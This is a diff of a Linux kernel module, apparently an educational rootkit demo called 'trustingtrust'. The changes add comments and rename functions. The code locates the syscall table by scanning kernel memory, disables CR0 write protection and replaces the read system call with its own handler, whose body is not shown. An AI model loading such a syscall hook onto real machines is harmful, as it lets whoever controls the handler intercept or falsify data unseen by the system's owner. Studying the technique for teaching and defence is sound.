@@ -1,12 +1,10 @@
 #include <linux/module.h> // needed for writing modules
 #include <linux/kernel.h> // kernel helper functions like printk
 
-#include <linux/syscalls.h>
-#include <asm/paravirt.h>
+#include <linux/syscalls.h> // The syscall table and __NR_<syscall_name> helpers
+#include <asm/paravirt.h> // read_cr0, write_cr0
 
 #include <linux/sched.h> // current task_struct
-
-/* TODO: Write more comments! >.< */
 
 /* The normal sys_call_table is const so we define our own to stub it out. */
 unsigned long **sys_call_table;
@@ -50,7 +48,9 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
 
 static unsigned long **aquire_sys_call_table(void)
 {
-	/* PAGE_OFFSET is a macro */
+	/* PAGE_OFFSET is a macro which tells us the offset where kernel memory begins,
+     * this keeps us from searching for our syscall table in user space memory
+     * */
 	unsigned long int offset = PAGE_OFFSET;
 	unsigned long **sct;
 	/* Scan memory searching for the syscall table, which is contigious */
@@ -72,33 +72,47 @@ static unsigned long **aquire_sys_call_table(void)
 	return NULL;
 }
 
-static int __init interceptor_start(void)
+static int __init trustingtrust_start(void)
 {
-	if(!(sys_call_table = aquire_sys_call_table()))
+    /* The whole trick here is to find the syscall table in memory
+     * so we can copy it to a non-const pointer array,
+     * then, turn off memory protection so that we can modify the
+     * syscall table.
+     */
+
+    // Find the syscall table in memory
+    if(!(sys_call_table = aquire_sys_call_table()))
 		return -1;
-
-	original_cr0 = read_cr0();
-
-	write_cr0(original_cr0 & ~0x00010000);
-	ref_sys_read = (void *)sys_call_table[__NR_read];
+    
+    // record the initial value in the cr0 register
+    original_cr0 = read_cr0();
+    // set the cr0 register to turn off write protection
+    write_cr0(original_cr0 & ~0x00010000);
+	// copy the old read call
+    ref_sys_read = (void *)sys_call_table[__NR_read]; 
+    // write our modified read call to the syscall table
 	sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
-	write_cr0(original_cr0);
+	// turn memory protection back on
+    write_cr0(original_cr0);
 
 	return 0;
 }
 
-static void __exit interceptor_end(void)
+static void __exit trustingtrust_end(void)
 {
 	if(!sys_call_table) {
 		return;
 	}
 
+    // turn off memory protection
 	write_cr0(original_cr0 & ~0x00010000);
+    // put the old system call back in place
 	sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
-	write_cr0(original_cr0);
+	// memory protection back on
+    write_cr0(original_cr0);
 }
 
-module_init(interceptor_start);
-module_exit(interceptor_end);
+module_init(trustingtrust_start);
+module_exit(trustingtrust_end);
 
 MODULE_LICENSE("GPL");
